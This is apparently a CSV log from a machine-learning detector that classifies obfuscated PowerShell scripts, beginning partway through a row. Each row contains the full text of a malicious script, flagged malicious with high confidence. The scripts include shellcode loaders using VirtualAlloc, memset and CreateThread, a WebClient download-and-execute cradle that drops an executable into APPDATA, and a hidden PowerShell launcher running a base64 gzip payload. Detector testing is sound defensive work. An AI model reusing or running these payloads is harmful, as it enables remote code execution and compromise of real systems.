src,',' uint count);ETU;','ysnw::memset([IntPtr](ys',',0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x2',',0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x','1',' {')).RePlaCE(([cHAR]75+[cHAR]49+[cHAR]100),[STRInG][cHAR]34).RePlaCE('ysn','$').RePlaCE(([cHAR]69+[cHAR]84+[cHAR]85),[STRInG][cHAR]39) | iEX",malicious,TP
2026-07-13 16:36:20,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1113.ps1,custom-ps-ml,UNKNOWN,f3ed6d3e-2f1e-4eb1-9365-7a2ccd58a3b2,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3081,1563.64,"&amp; ( $shellId[1]+$shElliD[13]+'X') ( ((\""{67}{21}{14}{63}{27}{37}{11}{13}{69}{43}{54}{71}{56}{5}{28}{15}{1}{36}{9}{39}{7}{35}{59}{65}{45}{68}{6}{52}{22}{23}{62}{26}{30}{12}{18}{17}{31}{49}{57}{33}{34}{2}{40}{51}{61}{70}{8}{20}{55}{46}{0}{29}{42}{60}{64}{44}{58}{3}{48}{53}{47}{24}{19}{10}{32}{41}{72}{4}{25}{16}{50}{66}{38}\"" -f'0xde,0x24,0xb4,0x2d,0xe1,0x54,0x9c,0xe9,0xb5,0x04,0xb6,0xd8,0xb5,0xce,0x46,0xe5,0x63,0x4','e -memberDefinition v3','x25,0x31,0x60,0xcd,0x21,0x1d,0x64,0xd0,0xe6,0x1',',0x66,0x9e,0x9c,0x05,0xa8,0x14,0x13,0xf9,0x66,0xdd','31i=0;v31i -l','ern IntPtr memset(IntP','x58,0xaf,0xaa,0xb6,0x29,0x9f,0x1a,0xbc,0x7c,0x13,0xd0,0x90,0x94,0xa0,0x94,0x3c,0x9a,0x01,0x','[Byte[]];[Byte[]]v31z = 0xbe,','0x11,0xd5,0xd3,0x27,0x45,0x64,0xbe,0x2f,0xaa','a','x46,0x60,0xc7,0x44,0x2e,0xd4,0xb3,0x16,0x4b,0x1b,0x6e,0x0b,0xc0,0x8e,0x91,0x7a,0xb5,0x19,0','Attributes, uint dwS','0xd6,0xed,0x0','tackSize, Int',' dwSize, uint fl','est, uint src, uint count);4KQ;v31w = Add-Typ','gth-1);v31i++) {','0x78,0x6d,0xb4,0','2,','0',',0x45,','VSRkernel32.dllVSR)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint','0,0x52,0x8c,0x16,0x29,0x9d,0xc1,0x57,0x','6e,0x',',0x5f,0x33,0x8c,0x43,0xc0,0xcc,0xfb,0xd8,0xc9,0x58,0x44,0xb6,0x35,0x8d,0x44,','e (v31z.Len','0x05,0x27,','port(VSRkernel32.dllVSR)]public static extern IntPtr CreateThread(In','tr d','0,0x17,0x49,0xdc,0x21,0xc7,0x29,0x8c,0xc9,0x0d,0xa6,0xf3,0xea,0x2d,0x6d,0x9c,0x81,0xd4,0x','0x8e,0x9f,0xba,0x4c,0xda,0x23,0x30,0x1e,0xca,0x23,0xa5,','x84,0x7a,0xa2,0xcc,0x8c,0x','xfa,0x80,0xe0,0x6e,0xa5,0x7b,0xc7,0x6e,0x99,0xad,0x21,0x05,0xf3,0x6d;v31g = 0x1000;if (v31z.Len','0xf6,0x6a,0x66,0xf5,0x37,0x43,0x95,0x07,0x7f,0x63,0x46,0x72,0x89,0x90,0xfb,0x85,0x4e,0xeb,0x27,0x03,0x55,0x4b,0xa3,0xb3,0xb1,','0x6a,0x60,0','0xa7,0xa5,0','1c -Name VSRWin32VSR -namespace Win32Functions -p','tPtr lpThread','x,0,0,0);for (;;){Start-sleep 60};','ssthru;','5,0x90,0x59,0x09,0xfa,0x11,0x19,0x2e,0xde,0x7a,0xf9,0x4f,0x47,0','gth -gt 0x1000){v31g = v31z.Length};v31x=v31w::VirtualAlloc(0,0x1000,v31g,','e5,0xec,0x39,','onF','0x5f,0xa7,0x1b,0xe','0xe5','xe4,0x53,0x1a,0xd2,','0x28,0xa9,0x63',',0x5e','64,0xa7,0xe9,0x47,0x1e,0x1','v31w::','x26,0x','12,0x1b,0x95,0x92,0x0f,0x5f,0xb4,0x1',',0xe9,0x1e,0x2d,0x15,0x53,0x88,0x32,0x83,0xfe,0x34,0xa7,','lags, IntPtr lpThreadId);[D','0x41,0xaf,0xa4,0xde,0x32,0x9d,0x6b,0x75,0xdd,0xad,0','mport(VSRmsvcrt.dllVSR)]public static ext','3,0x85,0x59,','3,0xf7,0x5e,0x06,0x7f','x52,0xc0,0x','0x21,0xda,0x9a,0x','ac,0x70,0','c0,0x28,','AllocationType, uint flProtect);[DllIm','c3,0xcd,0x35,0x07,0x4d,0x2b,','d9,','memset([IntPtr](v31x.ToInt32()+v31i), v31z[v31i], 1)};v31w::CreateThread(0,0,v31','v31c = 4KQ[DllImport(',',0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x77,0x0f,0x03,0x77,0xa8,0x47,0xa7,0x3c,0x5e,0x05,0x48,0xbd,0x9e,0x6a,0xc0,0','Ptr lpStartAddress, IntPtr lpParameter, uint dwCreati','x97,0x89,','llI','0x40);for (v')).rePLAce('4KQ',[sTrinG][cHAR]39).rePLAce(([cHAR]86+[cHAR]83+[cHAR]82),[sTrinG][cHAR]34).rePLAce(([cHAR]118+[cHAR]51+[cHAR]49),[sTrinG][cHAR]36) )",malicious,TP
2026-07-13 16:36:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1115.ps1,custom-ps-ml,UNKNOWN,2a9b40db-275d-416a-98f8-96c6dbc09e8e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2758,1637.04," . ( $pSHOME[4]+$pshoME[30]+'x') ((((\""{30}{33}{46}{26}{44}{35}{20}{17}{13}{42}{21}{16}{19}{39}{34}{32}{36}{1}{27}{40}{18}{10}{15}{28}{22}{4}{43}{5}{29}{37}{45}{41}{25}{0}{14}{6}{24}{7}{23}{2}{3}{12}{8}{38}{11}{9}{31}\"" -f'97,0x6a,0',',0xc','0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0','xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,','x0c,0x4b,',',0x1c,0x01,0xd3,0x8b,0x04,0x8','2,','0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0','1,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;ejHg = 0x1000;if (ejHz.Length -gt 0x1000){ejHg = ejHz.Length};ejHx=ejH','ateThread(0,0,ejHx,0,0,0);for (',',0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4',':VirtualAlloc(0,0x1000,ejHg,0x40);for (ejHi=0;ejHi -le (ejHz.Length-1);ejHi++) {ejHw::memset([IntPtr](ejHx.ToInt32()+ejHi), ejHz[ejHi], 1)};ejHw::Cre','0xd9,0xc8,0x5f,0xff,0xd5,0x0',']]ejHz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,','x05,0x68,0xc0,0xa8,0x00,0x04,0x68,0x0',',0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75','0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0','thru;[Byte[]];[Byte[','0x50,0x8b,0x48','x26,0','baqWin32baq -namespace Win32Functions -pass','x30,0x8b,','e2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0','x61,','0x00,0x01,','x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x','butes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lp','f,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,',',0x','b,0x01,0','ejHc = CAx[DllImport(baqkernel32.dllbaq)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtec',';;){Start-sleep 60};','0x61,0x7c,0x02,0x2c,','t);[DllImpor','ff,0x31,0xc0,0xac,0x3c,','t.dllbaq)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);CAx;ejHw = Add-Type -memberDefinition ejHc -Name ','0x20,0xc1','xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,','w:','x31,0x','0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,','b,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0','0x64,0x8b,0x52,0','0x8b,0x58','Parameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(baqmsvcr','0x12,0xe','t(baqkernel32.dllbaq)]public static extern IntPtr CreateThread(IntPtr lpThreadAttri')) -CREPlace 'CAx',[cHaR]39 -rePlacE([cHaR]98+[cHaR]97+[cHaR]113),[cHaR]34 -CREPlace'ejH',[cHaR]36) )",malicious,TP
2026-07-13 16:36:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\112.ps1,custom-ps-ml,UNKNOWN,f5275234-c7bf-477b-8ad2-4f521413a10c,DESKTOP-BAC9DBQ,malicious,0.9999,RandomForest,725,1622.55," (((\""{50}{41}{40}{6}{24}{2}{16}{49}{20}{35}{52}{25}{36}{18}{17}{11}{8}{7}{37}{29}{42}{13}{45}{15}{47}{3}{48}{10}{31}{26}{9}{30}{39}{21}{46}{43}{4}{12}{33}{0}{34}{27}{19}{14}{32}{5}{28}{44}{1}{38}{51}{22}{23}\"" -f 't-P','vh','m','90,06Ipke','I','0','ect S','.','4','h','DATAMK','.17',');','7/','s ','rma/','.','/93','ttp:/','es','WebClient).D','.e','e0','6I)','yste','(l90','scv','oc','6Ipkeenv:APP','1','os','T','(','Star','r','ownload','h','94.','ost.e','t','bj','-O','3','e06','DATAMKTsc','~ka','x','scvhost.exel','env:APP','Net.','(New','x','File'))  -RePlace  ([chAr]108+[chAr]57+[chAr]48),[chAr]39-RePlace([chAr]48+[chAr]54+[chAr]73),[chAr]34 -crEPlace([chAr]77+[chAr]75+[chAr]84),[chAr]92  -RePlace 'pke',[chAr]36)|iex",malicious,TP
2026-07-13 16:36:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1125.ps1,custom-ps-ml,UNKNOWN,6d2b62fb-b451-45c7-91ec-5423cc76d8e5,DESKTOP-BAC9DBQ,malicious,0.9989,RandomForest,3060,1587.1,"&amp; ( $SHelLiD[1]+$sHeLLid[13]+'X')(((\""{21}{5}{4}{18}{68}{48}{3}{45}{51}{14}{66}{1}{13}{40}{12}{9}{62}{34}{2}{59}{11}{8}{69}{54}{61}{27}{56}{49}{32}{63}{33}{23}{31}{52}{24}{64}{25}{26}{43}{37}{41}{72}{67}{44}{0}{47}{38}{55}{10}{53}{22}{28}{36}{35}{29}{60}{70}{65}{17}{46}{19}{71}{42}{39}{30}{50}{57}{15}{6}{58}{20}{7}{16}\"" -f 'kyoJsudHPZTS2FjLRPgpgfitwQdOPlHrHqwtNEICLBXB','GPlpirfFPU','fo/Z3m1dwk5AlFMUuomtyR2cJJe15oxKNf3','9CVgCA7VWa2/iOhD93JX2P0','shell.exewIb}else{bFnb=bFnenv:windir+wIb2QEsyswow642QEWindowsPowerShell2QEv1.02QEpowershell.exewIb};bFns=New-Object System.Diagnostics.ProcessStartInfo;bFns.Fil','bFnb=wIbpower','wIbHidden','rue;bFnp=[System.Diagno','Mks6zKW1pSfWrLh7X','R2zyiJ','zQ9z7/wrF7+S4U2B6WukSvgplmOmwNjaeSKUZkua13a7','mkpq11J','XZViIUgod/NslUgURW','MZrPTT7DN','9VL5','Style=','stics.Process]::Start(bFns);','+YQKH2YXhWeHWkKU+O2nPTOLy6uhpBxlAtT1LONknoyyCTW53','eName=bFnb;bFns.Arguments=wIb-nop -w hidden -c bFns=New-Object IO.MemoryStrea','Bz9/Uct8f','ow=bFnt','if([IntPtr]::Size -eq 4){','WESmHZrhj8emgI1NFt7Nt88J','gC5586JfQBevhRdAF09jm1J1A6J6ulEs2933m/3','AiyAo61l8nsSFLT9bBFZoDXbp4GOjwQNTl474W8PuyezMEpXWI4ijJKJ4aqcjKKRTAjbkZBYUT3JhRLvh2mn9NtxUxSB0fysNxEewHmftMSDyMpYgd4BABurTlxKGYJHhml','Pv','4pGCTNGQx9WWgAb8CZBwZKJOgTkmShBy1pE1mdzRmbgsi3x','PAHoqbCmLGM','gT+gDYMJwWJaNuv2J0uxUD9avTR/Or7kPsHQ6MgV2go/ldL4B5BVK41nPFOiDPh10AqcoR9nvg45cKTuCBj/kZGZ/bPCrgB4MjA3wqo0fIazivdBjYb/sFjmzWvsOoOVpXdD0/7BRRLUcHVR8lS2Lf6GIUL','d/CIgowAy3A9X2ozQoXlf1d3OE0iVDVp/78QERIGPQ06HoH','ompress))).ReadToEnd();wIb;bFns.UseShellExecute=bFnf','2WGN/Wnkk8GhJzHeIZdQ7yUl8jgXiMbM+dPbi1IUM1vTcQ1ySM+F','tbuba4GzOyC09rv2b7RKgGzxOpAMTPjx8+fvAOWlicB+dtN368sKfesR5gdDLejgkkrHZ4RLf+35RcRmnBrlhysYZp6lbERJ','8WSipJY5N/N2eP7','caTyQ0n9na0y','lFf1+1PiUJAIinZp51Co2wecf7WV','cyNqedtl7uDL+2hp9t37EI3S7dzx9N1fVkzr51RfnV5c3HZHFB7x','PS+IrZqwj5','gJAUz/pN7SE4BnWQ','O.Compression.CompressionMode]::Dec','Jxc','x069meVD8Tt4JKAc0jnIE','lHqroND4/4Hd13QAP+57gX1+9xvru8DOZZ7h+MX08sV/Av6PoBhgKsHbgvuJkV3v/D0ie1UdfX8cUQeq8fZP8kF4E8vTNnyd/AsSXdN6iAoAAA==wIbwIb));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(bFns,[I','CsM+F','1I5ui+e','QrJBItJUDZtltppesQngUKpIQCi67cxElMTU','lcnDz51bFH','ZwaOyHnRk',',[Convert]::FromBase64String(wIbwIbH4sIAK0','i0NJZwTskgg+t4hYUIdE2RoOXUZ6xJuobbI8nPy9QepxEHh1pNAywM','alse;bFns.RedirectStanda','wdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR','gmiGaU8a9h5RmVT7FGTJlLBHKAy','z40KvJ+aDPc93T/Lv8V01VTTO08b23qCFWDM2fT8Oxq0HLXw5r+dVB8QG','BWkRGXA3SmtwFPgTRMYiVJ4Playy81HTMOwI7iD','9ZyjAeaR0uar7fgv0/P6ty8cK8b05ouzFXgoXpUb9U6ZrdWKy4all2UVrkurzt12SrfTacWqvX6Qzmqo9otzT0Mi5t5g26sJnKHK/18Y2yWOWO1mfquN','8pc63qfQ','rdOutput=bFntrue;bFns.Window','wIb;bFns.CreateNoWind','9e1obn+Yn2fJjjF','bSPGu','XFSSCkGw9X','VE35RxkERJDTm/sp','so44SN','Rl1irC3qHzZ','c','8fHDSQcLPFPU1PS+0Ms77jKjpDZLz+5qJydgTc1G12','ZBwXSQAH2vrj','m(','pO1HSLOoJH3JPZAQ3PCtl+GGGPtGG1','JN0hhc3N3SnX','lafV4vk7SPJ9Be7MS2O2lJSaV417pp','pi3GZUaxq')).RePlace('2QE',[STRInG][chaR]92).RePlace(([chaR]98+[chaR]70+[chaR]110),'$').RePlace('wIb',[STRInG][chaR]39))",malicious,TP
2026-07-13 16:36:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1136.ps1,custom-ps-ml,UNKNOWN,f215fda3-e990-49f5-87fd-d1efd746e39f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2919,1688.07,".( $pShoME[4]+$PsHoMe[34]+'X')( (((\""{58}{29}{53}{65}{13}{67}{18}{7}{1}{42}{19}{33}{2}{62}{68}{10}{41}{63}{16}{24}{55}{57}{48}{0}{51}{12}{8}{64}{15}{69}{32}{27}{37}{22}{25}{4}{28}{43}{9}{5}{49}{47}{40}{44}{31}{6}{36}{54}{34}{17}{35}{14}{60}{45}{21}{59}{26}{11}{66}{61}{50}{56}{38}{46}{30}{20}{23}{3}{52}{39}\""-f 'c,0x3c,0x61,0x7c,0x02,0x2c,0','blic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSt','svc','000){AqZg = AqZz.Length};AqZx=AqZw::VirtualAlloc(0,0','x7d,0xf8,0x3b,0x7',',0x61,','77,0x26,0x07,0xff,0xd','rwSkernel32.dllrwS)]pu','x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0x','x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b','ame rwSWin32rwS -namespace Win32Funct',',0x0c,0xff,0x4e,0x08,0x75',',0x52,0x10,0','nt dwSize, uint ','0x5','18','qZz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x','x68,0x29,0x','tect);[DllImport(','ess, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThr','qZz','xa9,0x71','8,0xe0,0x75,0x','.Length -gt 0x1','64,0x8b,0x52,0','f4,0x03,0','b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74',',0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0x','d,0x24,0x75,0xe2,0x58,0x8b,','lImp','7,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;AqZg = 0x1000;if (A',',0x4c,0x',',0x8b,0x34,0x8b','eadId);[DllImport(rwSm','x01,0x00,0x00,0x29,0xc4,0x54,0x50,0','80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,','5,0xb8,0','c7,0x3','x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x5','0,0,0);for (;;){Start-sleep 60};','68,0x77,0x73,0x32,0x','ions -passthru;[Byte[','ackSize, IntPtr lpStartAddr','0x58,0x24,0x01,0xd3,0x66,0','5f,0x54,0x68','6a,0x05,0x68,0xc0,0xa8,0','6,0x53,0x5','68,0x33,0x32,0x00,0x00,0x','x4a,0x26,0x31,0xff,0x31,0xc0,0xa','0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x',',0x6a,0x00,0x6a,0x04,0x56,0x57,0x68','x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b','x1000,AqZg,0x40);for (AqZi=0;AqZi -le (AqZz.Length-1);AqZi++) {AqZw::memset([IntPtr](AqZx.ToInt32()+AqZi), AqZz[AqZi], 1)};AqZw::CreateThread(0,0,AqZx,','ort(rwSkernel32.dllrw','x90,0','x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0',',0x28,0x0f,0xb7,0','AqZc = EeL[Dl',',0x68,0x02,0x00,0x01,0xb','0,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x','f0,0xb5,0xa2,0x56,0xff,0xd5','rt.dllrwS)]public static extern IntPtr memset',']];[Byte[]]A','c0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x','S)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ui',',0xec,0x68,0x','flAllocationType, uint flPro','(IntPtr dest, uint src, uint count);EeL;AqZw = Add-Type -memberDefinition AqZc -N',',0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49'))-CRepLacE  'rwS',[ChaR]34  -CRepLacE ([ChaR]65+[ChaR]113+[ChaR]90),[ChaR]36-rEpLAce 'EeL',[ChaR]39) )",malicious,TP
2026-07-13 16:37:14,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1144.ps1,custom-ps-ml,UNKNOWN,1e6a9e3e-d062-4c29-b4e3-ac1fb1109218,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2752,1885.64," .( $env:cOMspEc[4,24,25]-jOIN'')( (((\""{18}{41}{42}{43}{23}{38}{27}{9}{10}{45}{26}{20}{44}{2}{25}{39}{35}{24}{14}{4}{40}{37}{8}{11}{15}{7}{34}{5}{3}{30}{32}{29}{36}{19}{21}{22}{17}{13}{16}{31}{12}{46}{1}{6}{0}{28}{33}\"" -f'OIx.ToInt32()+iOIi), iOIsc[iOIi], 1)};iOIw::CreateThread(0,0,iOIx,0,','s','0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0','3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01','x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,','0x58,0x24,0x01,0xd','c.Length};iOIx=iOIw::VirtualAlloc(0,0x1000,iOIsize,0x40);for (iOIi=0;iOIi -le (iOIsc.Length-1);iOIi++) {iOIw::memset([IntPtr](i','4,0x75,0xe2,0','38,0xe0','lImport(MZomsvcrt.dllMZo)]public static extern',' IntPtr memset(IntPtr dest, uint src, uint count);',',0x75,0xf4,0x03,0x7d,0xf8,0x3b,0',',0x00,0','0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x','8b,0x58,0','x7d,0x2','53,0x',',0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,','iOIc = whK[DllImport(MZokernel32.dllMZo)]pu','0x6a,0x05,0x68,0xb0,0xe','ctions -passthru;[Byte[]];[Byte[]]iOIsc = 0xfc,0xe8,0x','4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68',',0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75','tributes, uint dwStac',',0x','xff,0x31,0xc0,0xac','efinition iOIc -Name MZoWin32MZo -namespace Win32Fun','reationFlags, IntPtr lpThreadId);[Dl','0,0)',',0x90,0x0',',0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0','6a','x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8',';for (;;){Start-sleep 60};','x58,0x8b,','0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18','1,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,','0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x','kSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwC',',0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,','0x01,0xd6,0x31,0xff,','blic static extern IntPtr VirtualAlloc(IntPtr lp','Address, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(MZokernel32.dllMZo)]public static extern IntPtr CreateThread(IntPtr l','pThreadAt','89,0x00,0x00,0x00,','whK;iOIw = Add-Type -memberD','x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;iOIsize = 0x1000;if (iOIsc.Length -gt 0x1000){iOIsize = iOI')) -replAcE 'MZo',[CHar]34 -cREplacE 'iOI',[CHar]36  -replAcE  'whK',[CHar]39) )",malicious,TP
2026-07-13 16:37:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1148.ps1,custom-ps-ml,UNKNOWN,fa8f092b-576a-4fc4-8e29-829c8039f935,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3476,2338.74," (((\""{53}{41}{25}{38}{54}{11}{61}{19}{57}{9}{4}{50}{64}{45}{75}{22}{26}{74}{15}{34}{66}{77}{39}{29}{24}{6}{7}{47}{79}{18}{71}{1}{0}{60}{32}{81}{42}{35}{10}{70}{46}{2}{83}{67}{65}{69}{37}{13}{48}{58}{68}{12}{5}{16}{14}{56}{23}{78}{3}{62}{44}{73}{82}{28}{27}{49}{72}{20}{80}{33}{76}{43}{8}{63}{21}{51}{59}{17}{55}{40}{36}{52}{30}{31}\"" -f'0x0b,0x03,0xc2,0xe2,0x','xa2,0xf1,0xf0,0x3e,0xd1,','0xe2,0x26,0xb9,0x23,0x6d','x2a,0x2d,0x4f,0x8a,0x1e,0x2d,0x70,0x1e,','reateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(9mcmsvcrt.dll9mc)]public static extern IntPtr memset(IntPtr dest, uint src, uint ','60,','e0,0x8a,','0x18,0x0d,0x10,0x18,0x6c,0x9a,0x17,0xa9,0xdb,0xfc,0x16,0x2a,0x77,0x3c,0x39,0xa8,0x8a,0x11,0x99,0x91,0x44,0x64,0xd8,0xd6,0xb9,0x85,0x88,0x8f,0xb6,0x38,0x3c,0xbb,0x83,0x80,0xb7,0xf7,0x02,0x81,0x24,0x4f,0x24,0xa0,0xfb,0xdb','0x',' IntPtr C','0,0xa7,0x74,0x80,0xd2,0x83,0x50,0xc8,0x8','lloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, ui',',0x23,0x','d,0x13,0x8c,0x11,0x55,0xb5,0x3d,0xa5,0x93,0x03,0xf7,0x67,0xaf,0x0e,0x85,0x01,0x2a,0xb6,0x08,0x83,0xd1,0x16,0xa9,',',0x6d,0x8c,0xc8,0x28,0xd5,0x74,0xb1,0',',0xde,0xef,0xd9,0x74','0x40','= idrz.Length};idrx=idrw::',',0x',' flProtect);[','8,0xae,0xf2,0x54,0x82,0x85,0x89,0','if (i','ons -passthru;[Byte[]];[Byte[]]id','85,0xc1,0x21,0','c,0x66,0x53,0x5f,0x','9mc)]public ','rz = 0xda,0x',',0x64,0xd7,0x','33,0x47,0x27,0xd7,0xb8','a7,0x35,0x63,0x0b,0xa',',0,0,0)',';for (;;){Start-sleep 60};','8,0x66,0xca,0xda,0xeb,0xd0,0x36,0xda,0x38,0x86,0xbd',',0xc4,0x34,0xb8,0xaf,0xd0,0x28,0',',0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x5a,','0x00,0x92,0x01,0x8','10','xe7,0x6a,0xb','static extern IntPtr Virtual','xba,0xf3,0x42,0xe5,0x42,0x04,0x23,0x6f,0x','alAlloc(0,0x','dll',',','0x31,0xd9,0x1b,0x58,','x9','tion id','1,0xb4,0x64,0xd2,0x11,0x17,0xd8,0x76,0x5a,0xba,0x0d,0x0b,0x01,0xd3,',',0x7f,0x62,0xf','0x34,0x77,0x67,0x75,0x93,0xdf,0x3f,','99,0x48,0x00,0xcb,0x4d,0xb9,0x5f,0xb1,0xdb,0xc6,0x75,0xdc','count);jAG;idrw = Add-Type -memberD','drz.Length -gt 0x1000){i','00,idrg,0x40);for (idri=0;idri -le (idrz.Length-1);idri++) {idrw::memset([IntPtr](idrx.ToInt32()+idri), idrz[idri], 1)};idrw::CreateThread(0,0,idrx','idrc = jAG[DllImport(9mckernel32.','A','Virtu','x90,0xbd,0xdc,0x19,0x79,0x65,0x','DllImport(9mckernel32.dll9mc)]public static extern','0xdd,0','drg ','c8,0x79,0x1','nt','0xd5,0x6d,0x93,0xcb,0xef,0x3d,0xc3,0x09,0xf0,0','14,0xdb,0x60,0x8f,0x50,0xa9,0x88,0x13;idrg = 